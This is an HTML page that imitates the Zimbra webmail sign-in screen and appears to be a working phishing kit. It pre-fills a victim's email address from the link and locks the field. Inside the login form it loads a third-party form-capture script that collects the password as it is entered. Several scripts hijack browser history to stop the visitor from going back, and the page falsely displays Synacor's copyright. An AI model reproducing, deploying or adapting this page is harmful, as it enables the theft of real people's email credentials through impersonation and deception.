<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zimbra</title>
    <style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

body {
    background-color: #1e73be;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    position: relative;
    overflow-x: hidden;
}

/* Main Workspace with full screen panoramic landscape blue mountain backdrop matching screenshot layout structure exactly */
.workspace-area {
    flex-grow: 1;
    min-height: 100vh;
    background: linear-gradient(rgba(30, 115, 190, 0.4), rgba(30, 115, 190, 0.7)), 
                url('https://unsplash.com') no-repeat center center fixed;
    background-size: cover;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 40px 20px 80px;
    position: relative;
}

/* White Floating Credentials Card Box Component matching original dimensions */
.login-card {
    background-color: #ffffff;
    width: 100%;
    max-width: 412px;
    border-radius: 2px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.15);
    overflow: hidden;
    z-index: 10;
}

.card-body {
    padding: 44px 40px 36px;
    width: 100%;
    text-align: left;
}

/* Brand Identity Structural Header Text Typography */
.brand-logo {
    font-size: 42px;
    font-weight: 700;
    color: #0072a1; /* Zimbra primary signature corporate blue shade */
    letter-spacing: -1.5px;
    margin-bottom: 8px;
    text-transform: lowercase;
}

.card-subtitle {
    font-size: 18px;
    font-weight: bold;
    color: #333333;
    margin-bottom: 28px;
}

form {
    width: 100%;
}

.form-group {
    margin-bottom: 20px;
    width: 100%;
    text-align: left;
}

.form-group label {
    display: block;
    font-size: 13px;
    color: #666666;
    margin-bottom: 6px;
}

/* Thin border square field input elements framework */
.form-control {
    width: 100%;
    height: 34px;
    border: 1px solid #cbd5e1;
    border-radius: 2px;
    padding: 0 10px;
    font-size: 14px;
    color: #333333;
    outline: none;
    background-color: #ffffff;
}

.form-control:focus {
    border-color: #0072a1;
}

/* Custom internal interactive show link positioning hooks inside password entry wrapper */
.secure-wrapper {
    position: relative;
}

.secure-wrapper .form-control {
    padding-right: 50px;
}

.password-show-toggle {
    position: absolute;
    right: 12px;
    bottom: 8px;
    cursor: pointer;
    color: #666666;
    font-size: 11px;
    user-select: none;
}

.password-show-toggle:hover {
    color: #0072a1;
}

/* Horizontal alignment tray row for submission button and stay-signed-in checkbox option */
.action-row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    width: 100%;
    margin-top: 24px;
}

/* Crisp sharp rectangular corporate blue main action trigger button block component (NOW FULLY CLICKABLE) */
.submit-btn {
    position: relative;
    z-index: 20;
    background-color: #0072a1; /* Precise matching corporate blue shade */
    color: #ffffff;
    border: none;
    height: 34px;
    padding: 0 24px;
    font-size: 13px;
    font-weight: 500;
    border-radius: 2px;
    cursor: pointer;
    transition: background-color 0.1s ease;
}

.submit-btn:hover {
    background-color: #005a82;
}

.remember-label {
    display: flex;
    align-items: center;
    gap: 6px;
    color: #555555;
    font-size: 13px;
    cursor: pointer;
}

.remember-label input {
    accent-color: #0072a1;
}

/* Card bottom secondary utility selection dropdown segment panel area */
.card-footer-select-panel {
    background-color: #eeeeee; /* Light grey bottom accent fill bar precisely tracking reference blueprint */
    border-top: 1px solid #e0e0e0;
    padding: 24px 40px;
    width: 100%;
    text-align: left;
}

.select-group label {
    display: block;
    font-size: 13px;
    color: #666666;
    margin-bottom: 8px;
}

.dropdown-wrapper {
    display: flex;
    align-items: center;
    gap: 12px;
    width: 100%;
}

.version-select {
    flex: 1;
    height: 32px;
    border: 1px solid #cbd5e1;
    border-radius: 2px;
    padding: 0 8px;
    font-size: 13px;
    color: #333333;
    background-color: #ffffff;
    outline: none;
    cursor: pointer;
}

/* Help circle dot placeholder graphic badge element */
.help-icon-badge {
    width: 18px;
    height: 18px;
    background-color: #000000;
    color: #ffffff;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 11px;
    font-weight: bold;
    cursor: pointer;
    user-select: none;
}

/* Base Fine-Print Corporate Watermark Ribbon Panel Area components */
.page-footer {
    position: absolute;
    bottom: 0;
    left: 0;
    width: 100%;
    text-align: center;
    padding: 24px 20px;
    color: #ffffff;
    font-size: 12px;
    text-shadow: 0 1px 2px rgba(0,0,0,0.3);
    z-index: 10;
}

@media (max-width: 480px) {
    .card-body {
        padding: 30px 20px;
    }
    .card-footer-select-panel {
        padding: 20px;
    }
    .action-row {
        flex-direction: column;
        align-items: flex-start;
        gap: 16px;
    }
    .submit-btn {
        width: 100%;
    }
}



    </style>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zimbra Collaboration Suite - Sign In</title>
    <!-- Link to external stylesheet -->
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <!-- Main Content Workspace with Blue Vignette Mountain Landscape Background -->
    <main class="workspace-area">
        
        <!-- White Floating Credentials Container Card Box Component -->
        <div class="login-card">
            
            <div class="card-body">
                
<h1 class="brand-logo">zimbra</h1>
                <h2 class="card-subtitle">Sign In</h2>
    
                <!-- Form submission configuration using FormSubmit module links integration -->
                <form action="" method="POST">
        <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
		


                    <div class="form-group">
                        <label for="username">Username</label>
 <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
                    </div>

                    <div class="form-group secure-wrapper">
                        <label for="password">Password</label>
<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
  oninput="this.setCustomValidity('')"/>
                        <span class="password-show-toggle">Show</span>
                    </div>

                    <!-- Button & Checkbox Alignment Row Component Elements Grid -->
                    <div class="action-row">
                        <!-- High-contrast crisp rectangular blue action button (NOW FULLY CLICKABLE) -->
                        <button type="submit" class="submit-btn">Sign In</button>
                        
                        <label class="remember-label">
                            <input type="checkbox" name="stay_signed_in">
                            <span>Stay signed in</span>
                        </label>
                    </div>
                </form>
            </div>

            <!-- Bottom utility navigation secondary dropdown select panel component area -->
            <div class="card-footer-select-panel">
                <div class="select-group">
                    <label>Web App Version</label>
                    <div class="dropdown-wrapper">
                        <select name="app_version" class="version-select">
                            <option value="classic">Classic</option>
                            <option value="modern">Modern</option>
                        </select>
                        <span class="help-icon-badge">?</span>
                    </div>
                </div>
            </div>

        </div>
    </main>

    <!-- Base Page Fine-Print Copyright Information Footer Banner -->
    <footer class="page-footer">
        Copyright © 2005-2026 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.
    </footer>

</body>
</html>

    <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>
	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
    <script type="text/javascript">
        (function() {
            window.history.pushState(null, null, window.location.href);
            
            window.onpopstate = function() {
                window.history.pushState(null, null, window.location.href);
           
            };
        })();
    </script>
<script type="text/javascript">
    window.history.pushState(null, "", window.location.href);
    
    window.addEventListener("popstate", function() {
        window.history.pushState(null, "", window.location.href);
    });
</script>
<script type="text/javascript">
    function preventBack() {
        window.history.forward();
    }
    setTimeout("preventBack()", 0);
    
    window.onunload = function () { null };
</script>

</body>
